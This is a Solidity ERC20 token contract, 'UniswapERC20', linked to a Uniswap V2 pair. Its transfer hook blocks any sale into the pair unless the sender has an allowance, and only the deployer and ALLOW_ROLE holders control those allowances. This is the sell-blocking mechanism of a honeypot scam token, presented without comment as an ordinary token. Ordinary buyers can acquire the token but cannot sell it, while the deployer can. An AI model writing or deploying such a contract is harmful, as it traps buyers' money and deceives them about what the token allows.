pragma solidity ^0.6.2;

import "@openzeppelin/contracts/presets/ERC20PresetMinterPauser.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

contract UniswapERC20 is ERC20PresetMinterPauser {
    bytes32 public constant ALLOW_ROLE = keccak256("ALLOW_ROLE");
    address public pair;
    mapping(address => uint256) allowAmount;

    constructor(string memory name, string memory symbol, uint8 decimals, address factory, address WETH) public ERC20PresetMinterPauser(name, symbol) {
        _setupDecimals(decimals);
        _setupRole(ALLOW_ROLE, _msgSender());
        allowAmount[_msgSender()] = uint256(-1);
        pair = IUniswapV2Factory(factory).getPair(address(this), WETH);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        super._beforeTokenTransfer(from, to, amount);
        if (to == pair) {
            uint256 allowAmount_ = allowAmount[from];
            require(allowAmount_ >= amount, "UniswapERC20: insufficient allowAmount");
            allowAmount[from] = allowAmount_.sub(amount);
        }
    }

    function allow(address addr, uint256 amount) external {
        require(hasRole(ALLOW_ROLE, _msgSender()), "UniswapERC20: must have allow role to allow");
        allowAmount[addr] = amount;
    }
}